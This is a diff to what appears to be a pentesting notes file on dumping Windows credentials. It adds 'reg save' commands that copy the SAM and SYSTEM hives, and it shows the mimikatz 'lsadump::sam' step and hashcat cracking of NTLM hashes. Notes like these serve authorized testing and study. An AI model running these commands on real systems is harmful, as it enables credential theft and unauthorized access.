@@ -184,7 +184,15 @@ Both of them can be found in the following path:
 
 **`C:\Windows\System32\config`**
 
-I use mimikatz for dumping the hashes:
+Dumping the hashes:
+
+If you have the SeBackupPrivilege or SeRestorePrivilege priviliges enabled you can dump them using the commandline:
+
+- `reg save hklm\system C:\TEMP\system.hive`
+
+- `reg save hklm\sam C:\Temp\sam.hive`
+
+Otherwise give mimikatz a go:
 
 Executing mimikatz
 - `mimikatz.exe`
@@ -195,7 +203,7 @@ The output of everyhing will be saved in **hash.txt** in the *current* directory
 dump out the hashes.
 - `lsadump::sam samfile.hiv systemfile.hiv`
 
-You can crack the hashes using hashcat with the -m switch, the value of 1000 corresponds with the NTLM hash type. Make sure to clean the poutput file and only leave the hashes inside.
+You can crack the hashes using hashcat with the -m switch, the value of 1000 corresponds with the NTLM hash type. Make sure to clean the output file and only leave the hashes inside.
 
 - `hashcat -m 1000 -a 0 hash.txt usr/share/wordlists/rockyou.txt`
 
